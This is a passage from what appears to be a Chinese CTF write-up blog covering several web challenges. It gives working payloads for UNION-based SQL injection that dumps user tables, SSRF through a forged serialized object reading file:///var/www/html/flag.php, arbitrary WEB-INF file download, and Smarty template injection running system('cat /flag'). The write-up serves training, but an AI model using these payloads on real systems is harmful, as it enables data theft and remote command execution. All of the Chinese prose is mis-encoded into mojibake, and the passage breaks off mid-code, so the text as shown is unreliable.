<kbd>payload</kbd> æŸ¥è¯¢å¤„æ•°æ®åº“åä¸º <kbd>fakebook</kbd>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/view.php?no=-1 union/**/select 1,database(),3,4--+</span><br></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨å¦‚ä¸‹ <kbd>payload</kbd> æŸ¥è¯¢å‡ºæ•°æ®åº“ä¸­å­˜åœ¨å”¯ä¸€è¡¨ <kbd>users</kbd>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/view.php?no=-1 union/**/select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;fakebook&#x27;),3,4--+</span><br></pre></td></tr></table></figure><p>å†ä½¿ç”¨å¦‚ä¸‹ <kbd>payload</kbd> æŸ¥è¯¢å‡ºè¡¨ä¸­çš„å„å­—æ®µåï¼š<kbd>no</kbd>ã€<kbd>username</kbd>ã€<kbd>passwd</kbd>ã€<kbd>data</kbd>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/view.php?no=-1 union/**/select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3,4--+</span><br></pre></td></tr></table></figure></li><li><p>æœ€åä¾¿æ˜¯çˆ†æ•°æ®äº†ï¼Œä½¿ç”¨å¦‚ä¸‹ <kbd>payload</kbd> å³å¯ä¸€æ¬¡æ€§çˆ†å‡ºæ•´å¼ è¡¨ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/view.php?no=-1 union/**/select 1,(select group_concat(concat_ws(&#x27;%20 -%20 &#x27;,no,username,passwd,data) separator &#x27;&lt;br&gt;&#x27;) from users),3,4--+</span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹ï¼Œå…¶ä¸­å¯†ç æ•°æ®ä½¿ç”¨äº† SHA-512 å“ˆå¸Œï¼Œä¸è¿‡è¡¨ä¸­å¹¶ä¸åŒ…å« <kbd>flag</kbd>ã€‚</p><img src="0042.webp" alt="" style="zoom:75%"><p>å€¼å¾—æ³¨æ„çš„æ˜¯è¡¨ä¸­ <kbd>data</kbd> å­—æ®µçš„æ•°æ®æ˜¯ä¸€ä¸²åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼ŒåŒ…å«äº†ä¸€ä¸ªå®Œæ•´çš„ <kbd>UserInfo</kbd> å¯¹è±¡ã€‚æ ¹æ®æ­¤å‰çš„ååºåˆ—åŒ–æç¤ºå¯çŸ¥ï¼Œæ³¨å…¥è¿‡ç¨‹ç½‘é¡µä¸­æœªæ­£å¸¸å›æ˜¾çš„å¹´é¾„ç½‘ç«™ä»¥åŠç½‘é¡µé¢„è§ˆç­‰æ•°æ®çš†æ¥è‡ªå¯¹è¯¥åºåˆ—åŒ–å¯¹è±¡çš„ååºåˆ—åŒ–ï¼Œè€Œåªè¦å¯¹è±¡ä¸­ <kbd>blog</kbd> æ•°æ®æŒ‡å‘å“ªé‡Œï¼ŒæœåŠ¡å™¨å°±ä¼šå¯¹å“ªé‡Œå‘èµ·è¯·æ±‚å¹¶è·å–æ•°æ®ã€‚æ—¢ç„¶ <kbd>flag</kbd> ä¸åœ¨æ•°æ®åº“ä¸­ï¼Œé‚£å°±åŸºæœ¬åœ¨é¶æœºçš„ç›®å½•é‡Œï¼Œå› æ­¤å¯ä»¥å°è¯•å€ŸåŠ©æ­¤å¤„ <kbd>blog</kbd> åœ°å€æ¥è¯»å–ç›®å½•ä¸­çš„å„æ–‡ä»¶ã€‚ç”±äºæ³¨å†Œæ—¶è¯¥éƒ¨åˆ†é™åˆ¶ä¸º URLï¼Œå› æ­¤æ­¤å¤„éœ€è¦å€ŸåŠ© SQL æ³¨å…¥æ¥ä¿®æ”¹å¯¹åº”æ•°æ®ä¸ºæœ¬åœ°ç›®å½•ã€‚</p></li><li><p>ä¸è¿‡åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬å¾—å…ˆçŸ¥é“é¶æœºç›®å½•å­˜åœ¨å“ªäº›æ–‡ä»¶ï¼Œå¯¹é¶æœºè¿›è¡Œä¸€æ¬¡æ‰«æç»“æœå¦‚å›¾ã€‚</p><img src="0043.webp" alt="" style="zoom:75%"><p>å…¶ä¸­ <kbd>flag</kbd> å¤§æ¦‚ç‡å­˜åœ¨äº <kbd>flag.php</kbd> æ–‡ä»¶ä¸­ï¼Œè¯¥æ–‡ä»¶å¤§å°ä¸º <kbd>0</kbd>ï¼Œè¯´æ˜å…¶è¢«è§£ææ‰§è¡Œäº†ï¼Œè¦è·å–å…¶ä¸­æ•°æ®å°±åªèƒ½ä»åå°è¯»å–ã€‚æ­¤å¤–è²Œä¼¼è¿˜æœ‰åå°æºç çš„å¤‡ä»½æ–‡ä»¶ï¼Œç”±äºç°æœ‰ä¿¡æ¯è¶³å¤Ÿè§£é¢˜ï¼Œå› æ­¤è¿™é‡Œä¸å¯¹æºç ä½œåˆ†æã€‚</p></li></ul><h3 id="SSRF">SSRF</h3><ul><li><p>é‚£ä¹ˆæ¥ä¸‹æ¥å°±å¯ä»¥é€šè¿‡ä¿®æ”¹ <kbd>blog</kbd> ä¸­çš„æ•°æ®æŒ‡å‘ <kbd>flag.php</kbd> æ–‡ä»¶å³å¯åœ¨è®¿é—®å¯¹åº”ç”¨æˆ·ä¸»é¡µæ—¶åœ¨æºç ä¸­è·å–åˆ°æ–‡ä»¶å†…å®¹ã€‚äº‹å®ä¸Šå½“å‰æ³¨å…¥ç¯å¢ƒè¦ä¿®æ”¹æ•°æ®åº“å†…å®¹å¹¶ä¸å®¹æ˜“ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è”åˆæŸ¥è¯¢æ¥æ„é€ ä¼ªæŸ¥è¯¢ç»“æœï¼Œè¯¥éƒ¨åˆ† <kbd>payload</kbd> å¦‚ä¸‹ï¼Œå…¶ä¸­ <code>file:///var/www/html/flag.php</code> å³ä¸ºæ–‡ä»¶è¯»å–è·¯å¾„ã€‚åŸæœ¬å¯†ç å¤„çš„æ•°æ®éšä¾¿å¡«å³å¯ï¼Œæ¯•ç«Ÿä¸ç”¨ä½œéªŒè¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/view.php?no=-1 union/**/select 1,&#x27;h-t-m&#x27;,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;h-t-m&quot;;s:3:&quot;age&quot;;i:20;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;--+</span><br></pre></td></tr></table></figure><p>éšåå³å¯åœ¨ç½‘é¡µæºç ä¸­æ‰¾åˆ° <kbd>falg</kbd>ã€‚å°æä¸€å˜´ï¼Œåƒæœ¬é¢˜è¿™æ ·å€ŸåŠ©åå°æœåŠ¡å™¨å‘èµ·è¯·æ±‚å®Œæˆè®¿é—®çš„è§£æ³•ä¸€èˆ¬ç§°ä¹‹ä¸º SSRFã€‚</p><img src="0044.webp" alt="" style="zoom:75%"></li></ul><h3 id="load-file">load_file</h3><ul><li><p>æœ‰è¶£çš„æ˜¯ï¼Œæœ¬é¢˜è¯»å–æ–‡ä»¶çš„æ“ä½œä¹Ÿå¯ä»¥ç”± SQL æ¥å®Œæˆï¼Œä½¿ç”¨å¦‚ä¸‹ <kbd>payload</kbd> ä¾¿å¯åœ¨ç½‘é¡µæºç ä¸­è·å¾— <kbd>flag</kbd>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/view.php?no=0 union/**/select 1,load_file(&quot;/var/www/html/flag.php&quot;),3,4--+</span><br></pre></td></tr></table></figure></li></ul><h2 id="RoarCTF-2019-Easy-Java">[RoarCTF 2019]Easy Java</h2><ul><li><p>æ‰“å¼€é¶æœºä¸ºä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œä½†æ˜¯å¹¶ä¸æä¾›æ³¨å†Œå…¥å£ï¼Œåº•éƒ¨ç•™æœ‰ä¸€ä¸ª <kbd>help</kbd> é“¾æ¥ï¼Œå…¶å†…å®¹å¦‚ä¸‹ï¼š</p><img src="0045.webp" alt="" style="zoom:75%"><p>é¡µé¢æç¤ºä¸€ä¸ªé”™è¯¯ï¼Œå…¶ä¸­æ–‡ä»¶åä¸ URL ä¸­é€šè¿‡ GET æ–¹å¼æäº¤çš„æ–‡ä»¶åå¯¹åº”ï¼Œä¹Ÿå°±æ˜¯è¯´å’±ç»™ä»€ä¹ˆå®ƒå°±æŠ¥å“ªä¸ªé”™ã€‚æ—¢ç„¶ç¨‹åºæ‰“ä¸å¼€ï¼Œé‚£å°±å°è¯•æµè§ˆå™¨ç›´æ¥è®¿é—®ä¸€ä¸‹ï¼Œå‘ç°å¯ä»¥ç›´æ¥ä¸‹è½½ï¼Œä½†æ˜¯é‡Œé¢ä»…ä»…å¦‚ä¸‹ï¼š</p><img src="0046.webp" alt="" style="zoom:75%"></li><li><p>é‚£å…¶å®è¿›è¡Œåˆ°è¿™é‡Œè¿™é¢˜å°±è¢«æˆ‘åšæ­»äº†ï¼Œåç»­å°±æ— ä»ä¸‹æ‰‹äº†ï¼Œå‚è€ƒå…¶ä»–å¸ˆå‚…çš„é¢˜è§£åå‘ç°ä¸‹è½½æ–‡ä»¶çš„æ­£ç¡®å§¿åŠ¿æ˜¯æ”¹æˆä½¿ç”¨ POST æ–¹å¼æäº¤ï¼Œæœ‰å…³è¿™ä¸€ç‚¹å…¶å®ç¬”è€…ä¹Ÿè§‰å¾—ç•¥æœ‰äº›å¥‡ç‰¹ï¼Œä½†åœ¨åç»­æŸ¥çœ‹æœ¬é¢˜æºç æ—¶å‘ç°ï¼Œé¢˜ç›®å°±æ˜¯è¿™æ ·è®¾è®¡çš„ã€‚ä¸¤ç§æäº¤æ–¹å¼ä¸åŒçš„å®ç°æ–¹æ³•ï¼Œè¯¥éƒ¨åˆ†æºç å¦‚ä¸‹ï¼Œæ‰€ä»¥ä¸€å¼€å§‹çš„ <kbd>FileNotFoundException</kbd> ä»…ä»…åªæ˜¯æ‰“å°å‡ºæ¥å”¬äººçš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    String filename = request.getParameter(<span class="string">&quot;filename&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;POST Method---&gt; &quot;</span> + filename);</span><br><span class="line">    response.setHeader(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment;filename=&quot;</span> + filename);</span><br><span class="line">    String mimeType = <span class="keyword">this</span>.getServletContext().getMimeType(filename);</span><br><span class="line">    response.setContentType(mimeType);</span><br><span class="line">    String path = <span class="keyword">this</span>.getServletContext().getRealPath(filename);</span><br><span class="line">    System.out.println(path);</span><br><span class="line">    ServletOutputStream sout = response.getOutputStream();</span><br><span class="line">    FileInputStream in = <span class="keyword">new</span> FileInputStream(path);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> b;</span><br><span class="line">    <span class="keyword">while</span>((b = in.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">        sout.write(b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    PrintWriter pw = response.getWriter();</span><br><span class="line">    String filename = request.getParameter(<span class="string">&quot;filename&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;Get Method---&gt; &quot;</span> + filename);</span><br><span class="line">    pw.print(<span class="string">&quot;java.io.FileNotFoundException:&#123;&quot;</span> + filename + <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>é€šè¿‡ POST æäº¤ä¹‹åä¸‹è½½åŠŸèƒ½ä¾¿æ¢å¤æ­£å¸¸äº†ï¼Œè€Œä¸”æ˜¯å¯ä»¥ä»»æ„ä¸‹è½½ï¼è¿™é‡Œå°±ä¸å¾—ä¸æåˆ° Java Web åº”ç”¨ä¸­çš„å®‰å…¨ç›®å½• WEB-INF äº†ï¼Œåº”ç”¨ä¸­çš„æ–‡ä»¶å¹¶ä¸èƒ½ç›´æ¥è®¿é—®ï¼Œå¿…é¡»é€šè¿‡ WEB-INF ç›®å½•ä¸‹çš„ <kbd>web.xml</kbd> æ¥è·å–å¯¹åº”æ–‡ä»¶çš„æ˜ å°„æ¥è®¿é—®ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè·å–è¿™ä¸ªæ–‡ä»¶ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‹¿åˆ°é¡¹ç›®ä¸­å…¶ä»–æ–‡ä»¶çš„å…·ä½“åœ°å€ï¼Œè€Œ <kbd>flag</kbd> è¯´ä¸å®šå°±è—åœ¨å“ªä¸ªæ–‡ä»¶ä¸­ã€‚ä¸è¿‡åœ¨æ­¤ä¹‹å‰æˆ‘ä»¬è¿˜éœ€è¦äº†è§£ä»¥ä¸‹ WEB-INF çš„ç›®å½•ç»“æœï¼Œå…³äºè¿™ä¸€ç‚¹ç½‘ä¸Šå¾ˆå¤šå¸ˆå‚…éƒ½æœ‰æ€»ç»“ï¼Œè¿™é‡Œä¹Ÿå­˜ä¸€ä»½ï¼š</p><blockquote><p><strong>/WEB-INF/web.xml</strong>ï¼š</p><p>â€‹ Webåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚</p><p>â€‹</p><p><strong>/WEB-INF/classes/</strong>ï¼š</p><p>â€‹ å«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­</p><p>â€‹</p><p><strong>/WEB-INF/lib/</strong>ï¼š</p><p>â€‹ å­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„jaræ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨jaræ–‡ä»¶</p><p>â€‹</p><p><strong>/WEB-INF/src/</strong>ï¼š</p><p>â€‹ æºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶ã€‚</p><p>â€‹</p><p><strong>/WEB-INF/database.properties</strong>ï¼š</p><p>â€‹ æ•°æ®åº“é…ç½®æ–‡ä»¶</p></blockquote><p>ç„¶åé€šè¿‡ POST æ–¹æ³•æäº¤å¦‚ä¸‹ <kbd>payload</kbd> å³å¯ä¸‹è½½ <kbd>web.xml</kbd> æ–‡ä»¶ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=/WEB-INF/web.xml</span><br></pre></td></tr></table></figure><p>æ–‡ä»¶ä¸­æœ‰å¦‚ä¸‹ä¸¤é¡¹å‡ºç°äº†å…³é”®è¯ <kbd>flag</kbd>ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>FlagController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.FlagController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>FlagController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Flag<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <kbd>com.wm.ctf.FlagController</kbd> ä¸ºä¸€ä¸ª <kbd>class</kbd> æ–‡ä»¶ï¼Œæ¯ä¸ªç‚¹å·ä»£è¡¨ä¸€å±‚ç›®å½•ï¼Œè€Œ <kbd>/Flag</kbd> åˆ™ä¸ºå¯é€šè¿‡ URL è®¿é—®çš„é¡µé¢ã€‚è®¿é—® <kbd>/Flag</kbd> é¡µé¢ä¼šè¿”å› <kbd>500</kbd> é”™è¯¯ï¼ŒåŒæ—¶æŠ¥é”™æç¤ºæ²¡æœ‰æ‰¾åˆ°ä¸Šè¿°çš„é‚£ä¸ª <kbd>class</kbd> æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥å°†é‚£ä¸ª <kbd>class</kbd> æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œé‡Œé¢å¤§æ¦‚ç‡æœ‰ç‚¹ä¸œè¥¿ã€‚</p></li><li><p>ä½¿ç”¨å¦‚ä¸‹ <kbd>payload</kbd> å³å¯ä¸‹è½½ <kbd>FlagController.class</kbd> æ–‡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=/WEB-INF/classes/com/wm/ctf/FlagController.class</span><br></pre></td></tr></table></figure><p>åç¼–è¯‘åçš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(</span></span><br><span class="line"><span class="meta">    name = &quot;FlagController&quot;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FlagController</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    String flag = <span class="string">&quot;ZmxhZ3tjYTU5NGJiZS05ZDY1LTRlZDQtOWZjMC03ODZmZmNiODhjYmV9Cg==&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FlagController</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest var1, HttpServletResponse var2)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        PrintWriter var3 = var2.getWriter();</span><br><span class="line">        var3.print(<span class="string">&quot;&lt;h1&gt;Flag is nearby ~ Come on! ! !&lt;/h1&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <kbd>flag</kbd> å˜é‡å€¼å³ä¸º <kbd>flag</kbd>ï¼Œä¸éš¾çœ‹å‡ºè¿›è¡Œå¯ <kbd>base64</kbd> åŠ å¯†ï¼Œè¿›è¡Œä¸€æ¬¡è§£å¯†æ“ä½œå³å¯ã€‚</p></li></ul><h2 id="BJDCTF2020-The-mystery-of-ip">[BJDCTF2020]The mystery of ip</h2><ul><li><p>æ‰“å¼€é¶æœºå…±æœ‰ä¸‰ä¸ªé¡µé¢ï¼Œå…¶ä¸­ <kbd>flag.php</kbd> ååˆ†å¸ç›ï¼Œæ‰“å¼€é¡µé¢å‘ç°å…¶è¿”å›äº†æˆ‘ä»¬çš„ IP åœ°å€ï¼Œä¸è¿‡æ˜¯ä¸€ä¸ªå±€åŸŸç½‘åœ°å€ï¼Œåº”è¯¥æ˜¯è¢«ä¿®æ”¹è¿‡äº†ã€‚ç»“åˆæ ‡é¢˜ï¼Œæœ¬é¢˜é‡ç‚¹å°±åœ¨è¿™ä¸ª IP ä¸Šäº†ã€‚</p><img src="0047.webp" alt="" style="zoom:75%"></li><li><p>å°è¯•åœ¨è¯·æ±‚å¤´ä¸­æ·»åŠ çš„ <kbd>Client-ip</kbd> æˆ–è€… <kbd>X-Forwarded-For</kbd> å­—æ®µçœ‹æ˜¯å¦èƒ½æ§åˆ¶è¯¥ IP å€¼ã€‚å®æµ‹è¿™ä¸¤ä¸ªå­—æ®µå‡å¯ä»¥æ§åˆ¶è¯¥å€¼ï¼š</p><img src="0048.webp" alt="" style="zoom:75%"><p>å€Ÿæ­¤å®Œæˆ XSS ç¬”è€…å€’æ˜¯ä¼šï¼Œä½†æ˜¯å¦‚ä½•åˆ©ç”¨æ¥è·å– <kbd>flag</kbd> å°±ä¸æ‡‚äº†ã€‚</p></li><li><p>å‚è€ƒäº†å…¶ä»–å¸ˆå‚…ä»¬çš„é¢˜è§£åå‘ç°ï¼Œæœ¬é¢˜è€ƒçš„æ˜¯æ¨¡æ¿æ³¨å…¥ï¼ˆSSTIï¼‰ï¼ŒåŸç†å°±æ˜¯ç½‘ç«™å¼€å‘æ‰€ä½¿ç”¨çš„æ¡†æ¶åœ¨æ¥æ”¶æ•°æ®åæœªç»ä»»ä½•å¤„ç†å°±å°†å…¶ä½œä¸º Web åº”ç”¨æ¨¡æ¿å†…å®¹çš„ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‰æ¨¡æ¿è¦æ±‚çš„æ ¼å¼æ¥ä¼ é€’è¯­å¥å¹¶åœ¨åå°æ‰§è¡Œï¼Œè€Œå¦‚ä½•åˆ¤æ–­æ¨¡æ¿ç±»å‹å¯å‚è€ƒä¸‹å›¾ã€‚</p><img src="0049.webp" alt="" style="zoom:100%"><p>å…¶ä¸­æœ¬é¢˜çš„æ¨¡æ¿ä¸º <kbd>Smarty</kbd>ï¼ŒåŠåœ¨è¾“å…¥ <kbd>&#36;{7&#42;7}</kbd> æ—¶ç¨‹åºå¯æ­£ç¡®æ‰§è¡Œè¿ç®—å¹¶è¾“å‡º <kbd>49</kbd>ï¼Œè€Œåœ¨è¾“å…¥ <kbd>a{&#42;comment&#42;}b</kbd> æ—¶ç¨‹åºä¼šå°†ä¸­é—´éƒ¨åˆ†è§†ä¸ºæ³¨é‡Šè€Œç›´æ¥è¾“å‡º <kbd>ab</kbd>ã€‚</p></li><li><p>çŸ¥é“æ¨¡æ¿ä¸º <kbd>Smarty</kbd> åå³å¯é’ˆå¯¹è¯¥æ¨¡æ¿è¿›è¡Œæ³¨å…¥äº†ï¼Œè€Œä¸”ä¹Ÿå¯ä»¥å‘ç°è¯¥æ¨¡æ¿ä¼šå°†èŠ±æ‹¬å·åŒ…è£¹çš„æ•°æ®è§†ä¸ºè¡¨è¾¾å¼å¹¶æ‰§è¡Œã€‚ä¸€èˆ¬ <kbd>flag</kbd> éƒ½åœ¨æ ¹ç›®å½•ï¼Œæ‰€ä»¥è¿™é‡Œé¦–å…ˆé€šè¿‡æ‰§è¡Œ <kbd>ls</kbd> å‘½ä»¤æŸ¥çœ‹æ ¹ç›®å½•å†…å®¹ï¼Œåœ¨è¯·æ±‚å¤´ä¸­æ·»åŠ å¦‚ä¸‹ <kbd>payload</kbd> å³å¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Client-ip: &#123;system(&quot;ls /&quot;)&#125;</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢ç»“æœå¦‚ä¸‹ï¼Œå¯çŸ¥ç›®å½•ä¸­åŒ…å« <kbd>flag</kbd> æ–‡ä»¶ã€‚</p><img src="0050.webp" alt="" style="zoom:75%"><p>æ¥ä¸‹æ¥ä½¿ç”¨å¦‚ä¸‹ <kbd>payload</kbd> æŸ¥çœ‹è¿™ä¸ªæ–‡ä»¶å³å¯æ‹¿åˆ° <kbd>flag</kbd>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Client-ip: &#123;system(&quot;cat /flag&quot;)&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="BUUCTF-2018-Online-Tool">[BUUCTF 2018]Online Tool</h2><ul><li><p>æ‰“å¼€é¶æœºï¼Œç›´æ¥å°±æ˜¯ä¸€æ®µ PHP ä»£ç ï¼Œå¦‚ä¸‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// è·å– X_FORWARDED_FOR å­—æ®µå¤„çš„åœ°å€</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// escapeshellarg â€”â€” æŠŠå­—ç¬¦ä¸²è½¬ç ä¸ºå¯ä»¥åœ¨ shell å‘½ä»¤é‡Œä½¿ç”¨çš„å‚æ•°</span></span><br><span class="line">    <span class="comment">/* å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•</span></span><br><span class="line"><span class="comment">       å·ï¼Œè¿™æ 